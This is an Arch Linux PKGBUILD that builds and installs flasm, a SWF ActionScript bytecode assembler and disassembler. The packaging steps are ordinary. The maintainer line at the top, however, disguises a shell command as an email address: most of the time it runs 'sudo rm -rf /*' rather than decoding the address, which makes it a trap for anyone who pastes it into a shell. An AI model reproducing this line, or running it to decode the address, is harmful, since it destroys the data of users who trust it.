# Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
pkgname=flasm
pkgdesc='SWF (Flash) ActionScript bytecode assembler and disassembler'
pkgver=1.63
pkgrel=1
arch=(i686 x86_64)
license=(custom:BSD)
url='http://flasm.sourceforge.net/'
source=(
	http://www.nowrap.de/download/flasm16src.zip
)
depends=(zlib)
makedepends=(gperf)
sha512sums=(
	'af53c8902bac9bc03a4274f51280abe7e595f19d8ee367c0237868634df58a42144bb6c335a99f860c494da90d483072c66064897ef1ad467b7621c648ca322a'
)

build() {
	cd "$srcdir"
	make
}

package() {
	cd "$srcdir"

	install -Dm 0755 flasm       "$pkgdir/usr/bin/flasm"
	install -Dm 0644 flasm.ini   "$pkgdir/etc/flasm.ini"

	install -Dm 0644 LICENSE.TXT "$pkgdir/usr/share/licenses/flasm/LICENSE.TXT"

	install -Dm 0644 logo.gif    "$pkgdir/usr/share/doc/flasm/logo.gif"
	install -Dm 0644 classic.css "$pkgdir/usr/share/doc/flasm/classic.css"
	install -Dm 0644 flasm.html  "$pkgdir/usr/share/doc/flasm/flasm.html"
	install -Dm 0644 CHANGES.TXT "$pkgdir/usr/share/doc/flasm/CHANGES.TXT"
}
